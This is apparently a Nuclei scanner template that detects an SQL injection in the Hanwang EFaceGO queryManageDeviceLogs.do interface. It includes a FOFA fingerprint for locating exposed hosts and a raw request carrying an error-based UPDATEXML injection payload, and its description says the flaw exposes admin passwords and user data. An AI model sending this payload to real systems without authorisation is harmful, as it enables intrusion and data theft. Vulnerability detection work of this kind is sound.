id: hanwang-EFaceGO-queryManageDeviceLogs_do-sql

info:
  tags: hanwang-EFaceGO-queryManageDeviceLogs_do-sql
  name: 汉王EFaceGO queryManageDeviceLogs.do SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: icon_hash="1380907357"
    汉王EFaceGO queryManageDeviceLogs.do 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        GET /manage/systemLogMgr/queryManageDeviceLogs.do?recoToken=67mds2pxXQb&t=1751959258092&begin=2025-07-01+00:00:00&end=2025-07-31+23:59:59&page=1&pageSize=25&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'qqjpq1qpkvq'
          - 'XPATH syntax error:'
        condition: and
      - type: status
        status: 
          - 200
